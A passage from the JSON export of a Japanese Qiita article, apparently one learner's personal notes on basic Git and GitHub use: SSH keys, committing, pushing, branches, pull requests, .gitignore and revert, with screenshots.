href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F389fedb9-3c76-4ac0-bc3f-7d342367f4fe.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2089cf6fd5c7e666f9d4c1fcf81c84f4\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F389fedb9-3c76-4ac0-bc3f-7d342367f4fe.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2089cf6fd5c7e666f9d4c1fcf81c84f4\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F389fedb9-3c76-4ac0-bc3f-7d342367f4fe.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=8e98220dac90f778b8f5d933bb322ded 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/389fedb9-3c76-4ac0-bc3f-7d342367f4fe.png\"></a></p>\n<p data-sourcepos=\"390:1-391:122\">featureブランチ消す<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1fc67aed-2308-4379-acd4-1f5e9432f3cb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5785bfe4af444bda6d315420d7689e08\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1fc67aed-2308-4379-acd4-1f5e9432f3cb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5785bfe4af444bda6d315420d7689e08\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1fc67aed-2308-4379-acd4-1f5e9432f3cb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=281973aede1b4e264a8f06879b64f797 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1fc67aed-2308-4379-acd4-1f5e9432f3cb.png\"></a></p>\n<p data-sourcepos=\"393:1-394:122\">消した<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F6e5c3c85-b10a-4b10-961e-2203bf8d3d24.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0ddf1da5cea622790f3225b49b9b1f07\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F6e5c3c85-b10a-4b10-961e-2203bf8d3d24.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=0ddf1da5cea622790f3225b49b9b1f07\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F6e5c3c85-b10a-4b10-961e-2203bf8d3d24.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6abb538ef7bef0919ba4ed42eaa85a80 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/6e5c3c85-b10a-4b10-961e-2203bf8d3d24.png\"></a></p>\n<p data-sourcepos=\"396:1-396:36\">ローカルに変更を取り込む</p>\n<p data-sourcepos=\"398:1-398:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd20810db-cc4b-498e-a5c3-89a51ed684bb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=98f9f40cce14739cfa34b0838850e8b7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd20810db-cc4b-498e-a5c3-89a51ed684bb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=98f9f40cce14739cfa34b0838850e8b7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fd20810db-cc4b-498e-a5c3-89a51ed684bb.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7586b6f5c72edae531dcf6d8eb573449 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d20810db-cc4b-498e-a5c3-89a51ed684bb.png\"></a></p>\n<p data-sourcepos=\"400:1-400:63\">ローカルのブランチは消えないので自分で消す</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"402:1-405:3\"><div class=\"highlight\"><pre><code># ブランチを削除\n$ git branch -d ブランチ名\n</code></pre></div></div>\n<p data-sourcepos=\"407:1-407:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2cb679b6-f6b6-4ff5-aac3-5d6f3f0a15fc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=7283b272234f02787d1469c821d8ab5d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2cb679b6-f6b6-4ff5-aac3-5d6f3f0a15fc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=7283b272234f02787d1469c821d8ab5d\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F2cb679b6-f6b6-4ff5-aac3-5d6f3f0a15fc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=f7e23ace7bc69fd23eac17fd2074f2ac 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2cb679b6-f6b6-4ff5-aac3-5d6f3f0a15fc.png\"></a></p>\n<h2 data-sourcepos=\"410:1-410:56\">\n<span id=\"エラー修正と取り消しrevertとリセット\" class=\"fragment\"></span><a href=\"#%E3%82%A8%E3%83%A9%E3%83%BC%E4%BF%AE%E6%AD%A3%E3%81%A8%E5%8F%96%E3%82%8A%E6%B6%88%E3%81%97revert%E3%81%A8%E3%83%AA%E3%82%BB%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>エラー修正と取り消し(revertとリセット)</h2>\n<ul data-sourcepos=\"412:1-415:0\">\n<li data-sourcepos=\"412:1-412:153\">\n<code>revert</code>は削除したいのコミット内容をその<code>コミットの前の状態に戻して再度コミットする</code>ことで取り消しをする</li>\n<li data-sourcepos=\"413:1-415:0\">\n<code>reset</code>は<code>削除対象のコミットを物理削除する</code><br>\n履歴管理としては物理削除はびみょーなので、あまり推奨されない</li>\n</ul>\n<p data-sourcepos=\"416:1-417:122\">git log で消したいコミットのIDを確認する、コピー<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa55bf4ea-b00e-46a5-9d90-e75dccafd1e5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=deae7f35298e7f7f978cff6a1093516e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa55bf4ea-b00e-46a5-9d90-e75dccafd1e5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=deae7f35298e7f7f978cff6a1093516e\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa55bf4ea-b00e-46a5-9d90-e75dccafd1e5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=980308ea0b88bdeac3eadd04155d6b50 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a55bf4ea-b00e-46a5-9d90-e75dccafd1e5.png\"></a></p>\n<p data-sourcepos=\"419:1-419:55\">git log -p コミットIDで変更内容を確認する</p>\n<h3 data-sourcepos=\"422:1-422:31\">\n<span id=\"コミットの取り消し\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%9F%E3%83%83%E3%83%88%E3%81%AE%E5%8F%96%E3%82%8A%E6%B6%88%E3%81%97\"><i class=\"fa fa-link\"></i></a>コミットの取り消し</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"423:1-426:3\"><div class=\"highlight\"><pre><code># コミットを打ち消す新しいコミットを作成（履歴を残す安全な方法)\n$ git revert コミットID\n</code></pre></div></div>\n<p data-sourcepos=\"428:1-428:123\">revertは打ち消し内容をコミットするので、コミットメッセージどうするよ？の画面出てくる</p>\n<p data-sourcepos=\"430:1-430:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa829baff-e67a-4b55-8550-efc3954be32e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f197bac5cb14b2578ed428de7f2594cf\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa829baff-e67a-4b55-8550-efc3954be32e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=f197bac5cb14b2578ed428de7f2594cf\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa829baff-e67a-4b55-8550-efc3954be32e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=786cac4c088d13028e7668b5787a851b 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a829baff-e67a-4b55-8550-efc3954be32e.png\"></a></p>\n<p data-sourcepos=\"432:1-432:69\">基本的にはなにもせんでいいのでctrl　x で脱出する</p>\n<p data-sourcepos=\"435:1-435:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe603a29d-4bed-439a-be90-9b6e5a34eb3e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c66b268349b1192e67c13c76aa403d00\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe603a29d-4bed-439a-be90-9b6e5a34eb3e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c66b268349b1192e67c13c76aa403d00\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe603a29d-4bed-439a-be90-9b6e5a34eb3e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=b915d53ebe18df5dba4305ba01303386 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e603a29d-4bed-439a-be90-9b6e5a34eb3e.png\"></a></p>\n<h2 data-sourcepos=\"437:1-437:27\">\n<span id=\"リベースの仕組み\" class=\"fragment\"></span><a href=\"#%E3%83%AA%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E4%BB%95%E7%B5%84%E3%81%BF\"><i class=\"fa fa-link\"></i></a>リベースの仕組み</h2>\n<p data-sourcepos=\"439:1-439:54\">こういうもんだという理解だけはできた</p>\n<p data-sourcepos=\"441:1-441:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Faf3c98ca-5d01-4352-950f-9f306fafac31.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ec0663e1b4cbca350e38314ce8a75af0\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Faf3c98ca-5d01-4352-950f-9f306fafac31.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ec0663e1b4cbca350e38314ce8a75af0\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Faf3c98ca-5d01-4352-950f-9f306fafac31.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=9df695f690230784c73da6011e9251d6 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/af3c98ca-5d01-4352-950f-9f306fafac31.png\"></a></p>\n","body":"# 基本概念\n## バージョン管理とは\nファイルの変更履歴を管理する\nエクセルファイルとかQA表よくこうなっているわ…\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e26a1d63-7785-4b96-b759-c921b19a935b.png)\n\n\n## 集中管理と分散管理\n* 集中管理(SVNなど)：ひとつのサーバーで管理するので、なにかしらアクセスできないとみんな最新のファイルやソースがとれない\n\n* 分散管理(Gitなど):各々がサーバーをローカルに持っている（ローカルリポジトリ）、共有するときだけ共有サーバー（リモートリポジトリ）にあげることで、オフラインでも作業ができる\nリモートリポジトリはGithubやGitLabなど\n\nいまいち分散管理のメリットがわからなかったけど、下記の記事で納得した。\n\n>分散型システムでは、各ユーザーがリポジトリの完全なコピーを持つことができるため、ネットワークにアクセスせずともローカルで作業を行うことができます。\n\nhttps://ramble.impl.co.jp/5948/\n\n# Git のワークフロー\nこれはclaudeがまとめてくれた\n1. 作業ディレクトリ（Working Directory）: ファイルを編集する場所\n2. ステージングエリア（Staging Area）: コミット対象のファイルを選択する場所\n3. ローカルリポジトリ（Local Repository）: コミットした変更が保存される場所\n4. リモートリポジトリ（Remote Repository）: GitHub などのクラウド上にあるリポジトリ\n\n# 初期設定\n## gitでコミットする際につかう名前とメールアドレス\n```\n$ git config --global user.name \"ユーザー名\"\n$ git config --global user.email \"メールアドレス\"\n```\n\n## SSHキーの生成とGitHubへの連携\n```\n# SSH キーを生成（-t rsa はrsa暗号方式だよ）\nssh-keygen -t rsa\n```\n3回エンター押す\n```\ntest@asa:~/jisou/workspace/git-practice$ ssh-keygen -t rsa\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/test/.ssh/id_rsa):\nCreated directory '/home/test/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\n```\n`id_rsa`と`id_rsa.pub`ができる\n* id_rsa.pub：公開鍵\n* id_rsa：秘密鍵　大切にとっておく\n```\ntest@asa:~/jisou/workspace/git-practice$ ls ~/.ssh\nid_rsa  id_rsa.pub\ntest@asa:~/jisou/workspace/git-practice$\n```\n\nできた公開鍵をコピーGitHubに登録\n```\n# 公開鍵を表示（コピーしてGitHubに登録する）\ncat ~/.ssh/id_rsa.pub\n```\nGitHubへサインイン、ユーザー画面から設定画面\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/afc45481-63e6-4843-be31-96676cfdac78.png)\n\n公開鍵を登録後接続確認\n```\n# 接続テスト\nssh -T git@github.com\n```\n\n```\n# これがでたらyesを押した\nssh -T git@github.com\nThe authenticity of host 'github.com (20.27.177.113)' can't be established.\nED25519 key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\n```\n\nhttps://docs.github.com/ja/enterprise-cloud@latest/authentication/connecting-to-github-with-ssh/testing-your-ssh-connection\n\nSSHでGitHubに初めて接続するとき、「GitHubサーバーが本物かどうか」を確認するために、そのサーバーの公開鍵をチェックします。\n\n🔑 公開鍵とは？\n公開鍵はサーバーが持っている鍵で、これが正しいかどうかを確認することで、そのサーバーがなりすましではないと保証できます。\nGitHubは公開鍵を持っていて、それを使って「自分はGitHubですよ」と証明しています。\n\nGitHubの公開鍵のフィンガープリント（指紋）が表示されているので、公式のものと一致しているか確認します。\n正しいことが確認できたら「yes」と入力することで、その公開鍵がローカルPCに保存されます。\n🗂 保存場所\n公開鍵は以下のファイルに保存されます：\n\n~/.ssh/known_hosts\nこのファイルには、過去に接続したことがあるサーバーの公開鍵が記録されているため、次回以降は同じ警告が出なくなるというわけです。\n\nhttps://qiita.com/ikura_ooo/items/12a6f474b1b80122212d\n\n# リポジトリ操作\n\n## ローカルリポジトリ作成\n作業したいディレクトリに移動\n```\n# 現在のディレクトリに Git リポジトリを作成\n git init\n```\nできた\n```\ntest@asa:~/jisou/workspace/git-practice$ ls -la\ntotal 12\ndrwxr-xr-x 3 test test 4096 Mar 14 21:59 .\ndrwxr-xr-x 6 test test 4096 Mar 14 21:26 ..\ndrwxr-xr-x 7 test test 4096 Mar 14 21:59 .git\ntest@asa:~/jisou/workspace/git-practice$\n```\n\n.gitは隠しファイル　基本的にはみれないよ\n\n## リモートリポジトリ作成\nリモートリポジトリを作る\n`git init でつくったリポジトリ（ローカルリポジトリ）`と\n`git hub上で作ったリポジトリ（リモートリポジトリ）`を同期させる\n\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9f8dcc43-1008-421e-8357-b85f2876395e.png)\n\nリモートリポジトリを作った後に以下のコマンドをコピー\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/109fcb9f-155c-4136-8db1-1136aa64474a.png)\n\n```\n# masterブランチ名をmainに変更\ngit branch -M main\n# リモートリポジトリはこれを使いますよを宣言\ngit remote add origin https://github.com/asa129/git_full_course.git\n```\n\nmasterからmainに変更したことと、同期がとれたことを確認\n```\ntest@asa:~/jisou/workspace/git-practice$ git status\nOn branch master\n\nNo commits yet\n\nnothing to commit (create/copy files and use \"git add\" to track)\ntest@asa:~/jisou/workspace/git-practice$ git branch -M main\ngit remote add origin https://github.com/asa129/git_full_course.git\ntest@asa:~/jisou/workspace/git-practice$ git status\nOn branch main\n\nNo commits yet\n\nnothing to commit (create/copy files and use \"git add\" to track)\n```\n\n\n## 基本的なコマンド\n* ローカルリポジトリにコミットする前に\naddコマンドでコミットするファイルを選べるよ、選んだものはステージングエリアというところに追加される\nコミットしたくないものはステージングエリアから外すこともできるよ（）\n\n* コミットすると、いろんな情報が確認できる　ID じかん　だれがこみっとしたか　変更内容\ngit log　でかくにんできるそう\n\n* git push クラウド上のリポジトリ（リモートリポジトリ）にローカルリポジトリの変更情報を反映\ngit pull クラウド上のリポジトリの最新情報をローカルリポジトリに反映\n\n### 変更情報を確認\n```\n# 変更情報を確認\ngit status\n```\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ddf9807c-0e9b-4b25-9dd7-7f85a4b6dcd3.png)\n\n### コミットしたいファイルをステージングする\n```\n# ファイルをステージングエリアに追加\ngit add ファイル名\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/f8ab9240-2a1e-4f1f-9f5e-f59db6103047.png)\n\n#### 複数ファイルをステージングする\n```\ngit add ファイル1 ファイル2\n```\n\n#### 全部のファイルをステージングする\n```\ngit add .\n```\n\n### コミットする\n```\n# ステージングされたファイルをコミット\ngit commit -m \"コミットメッセージ\"\n```\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7bb07160-ea32-426b-aab2-a148c37e66b8.png)\n\n### プッシュする\nローカルリポジトリに反映した（コミットした）変更をリモートリポジトリ（クラウド上のgithub）に反映する\n\n```\n# ローカルの変更をリモートに反映\n# originはリモートって意味 main はmainブランチ\ngit push origin main\n```\n\nこのエラーがでたら\n```\nUsername for 'https://github.com': asa129\nPassword for 'https://asa129@github.com':\nremote: Support for password authentication was removed on August 13, 2021.\nremote: Please see https://docs.github.com/get-started/getting-started-with-git/about-remote-repositories#cloning-with-https-urls for information on currently recommended modes of authentication.\nfatal: Authentication failed for 'https://github.com/asa129/git_full_course.git/'\n```\n\n\nhttps://docs.github.com/ja/get-started/git-basics/about-remote-repositories#cloning-with-https-urls\n\nこちらの記事を参考にパーソナルアクセストークンを作成\n\nhttps://qiita.com/aramasa_ash/items/3accb139d0296896caa2\n\n再度おこない、パスワード入力時にアクセストークンを入力\n\n### コミットの粒度\n* なるべく小さくしよう\n\n* コミット単位ごとにrevartというコマンドで元に戻すことができる\n* 一度にたくさんの変更をコミットすると、一部だけもとに戻したくても、他のもの全て変更前になってしまう\n\n### ステージングを取り消したい\n```\n# ステージングを取り消す\ngit restore --staged ファイル名\n```\n\nステージング取り消し前\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/8d09942f-1076-470c-b3f0-fb04b5ba68b1.png)\n\nステージング取り消し後\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/85c7039b-d149-430b-9c3d-1ed97a97a6ab.png)\n\n### ファイルの変更内容(差分)を確認する\n```\ngit diff\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e2ea1c19-3a2f-4e04-aa1e-113b34d7c4be.png)\n\n### ステージング前の変更内容を消したい\n\n```\n# 変更を元に戻す（ステージング前の変更を破棄）\ngit checkout ファイル名\n```\n変更破棄前\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e17484cb-9bcd-430c-9e9b-80151fa9660b.png)\n\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/023c16eb-a082-4c47-973f-7bad42acd31a.png)\n\n変更破棄後\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d1fa70c8-f77f-4b3d-9ffe-9382a60784d2.png)\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7671a36e-6ad3-42d1-a7de-14ce36cacf64.png)\n\n## Git 管理から除外\n* コミットやプッシュしたくない、してはだめなファイルがあるとき、対象のファイルをgit管理外にする\n\n* .gitignoreファイルを作って、中身に管理外にしたいファイル名を記載する\n\n### すでに追跡されているファイルをGitの管理対象から外したい場合\n```\ngit rm --cached ファイル名\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/7587c472-bd27-4143-8851-fc3ccd98fd7d.png)\n\n:::note alert\n注意点\n* ステージングしたあとは\nこれを消したことを再度コミット　pushしないと反映されない\n\n* pushしたあとはログ上に残ってしまう完全に消すことはできない\nprivateにかえるか、リポジトリを作り直すことも検討が必要\n\n* 本当にpushしてはいけないものは要注意\n悪用されてしまうこともある、APIキーとか…不正請求された例がある\n:::\n\n### コミットメッセージの編集\n\n```\ngit commit --amend\n```\n\nテキストエディタがでてくるので修正、テキストを閉じる\n\n\n## 履歴の確認\n\n```\n# コミット履歴を確認\ngit log\n```\n\n特定のコミットの変更内容を確認\nそのコミット情報の変更がみれる\n\n```\n# 特定のコミットの変更内容を確認\ngit log -p コミットID\n```\n\n## コンフリクトの解消\n\n```\n# リベースを使用して変更を取り込む\ngit pull -r origin main\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/540a7abf-dfe7-4968-adb0-10f0b78eac07.png)\n\ngit rebaseが必要？コミットはしたらだめ\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e3ace5b4-3fd3-4226-8d21-45df0bc31891.png)\n\n## ブランチプルリクマージ\n\n**ブランチとは：履歴の分岐ができるよ**\n\n### ブランチ何があるか確認する\n```\n# ブランチ一覧を表示（現在のブランチは * 表示）\n$ git branch\n```\n\n### 新しいブランチを作る\n```\n# 新しいブランチを作成\n$ git branch -M 作りたいブランチ名\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/67c8d809-7652-43d0-8ee9-5f3a3d8d95d7.png)\n\n＊は今現在いるブランチを表している\n\n### ブランチ変えたいとき(mainブランチなど)\n```\n# ブランチを切り替える\n$ git switch main\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/66c9edb5-a65a-4567-9c0e-92dc8580e08f.png)\n\n### pushするときはプッシュしたブランチの名前を指定する\n```\n# originはリモートの意味、featureブランチ\ngit push origin feature\n```\n\n## マージとプルリクエスト\n### ブランチの変更情報をmainにマージする\n\nfeatureブランチにpushするとgithub上で以下のダイアログがでてくる。`Compare & pull request`ボタンを押下する。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/cf29de72-553f-469a-8710-af62955f14cd.png)\n\nタイトルと修正内容を記載する\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5580e24e-f8af-4ca1-94b4-b3559d8f461d.png)\n\n\nこれがプルリクエスト！！！\n\nレビューとかをしてもらってから、mainブランチにマージする（してもらう）\n`Merge pull request`ボタンを押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2498677f-a5f8-4757-99ea-07a0d0edcdda.png)\n\nマージされた\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/13d20d72-2ead-453f-80e2-9e9434357416.png)\n\nマージされるとfeatureブランチは不要になるので、`Delete branch`ボタンで削除\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/389fedb9-3c76-4ac0-bc3f-7d342367f4fe.png)\n\nfeatureブランチ消す\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1fc67aed-2308-4379-acd4-1f5e9432f3cb.png)\n\n消した\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/6e5c3c85-b10a-4b10-961e-2203bf8d3d24.png)\n\nローカルに変更を取り込む\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/d20810db-cc4b-498e-a5c3-89a51ed684bb.png)\n\nローカルのブランチは消えないので自分で消す\n\n```\n# ブランチを削除\n$ git branch -d ブランチ名\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/2cb679b6-f6b6-4ff5-aac3-5d6f3f0a15fc.png)\n\n\n## エラー修正と取り消し(revertとリセット)\n\n* `revert`は削除したいのコミット内容をその`コミットの前の状態に戻して再度コミットする`ことで取り消しをする\n* `reset`は`削除対象のコミットを物理削除する`\n履歴管理としては物理削除はびみょーなので、あまり推奨されない\n\ngit log で消したいコミットのIDを確認する、コピー\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a55bf4ea-b00e-46a5-9d90-e75dccafd1e5.png)\n\ngit log -p コミットIDで変更内容を確認する\n\n\n### コミットの取り消し\n```\n# コミットを打ち消す新しいコミットを作成（履歴を残す安全な方法)\n$ git revert コミットID\n```\n\nrevertは打ち消し内容をコミットするので、コミットメッセージどうするよ？の画面出てくる\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a829baff-e67a-4b55-8550-efc3954be32e.png)\n\n基本的にはなにもせんでいいのでctrl　x で脱出する\n\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e603a29d-4bed-439a-be90-9b6e5a34eb3e.png)\n\n## 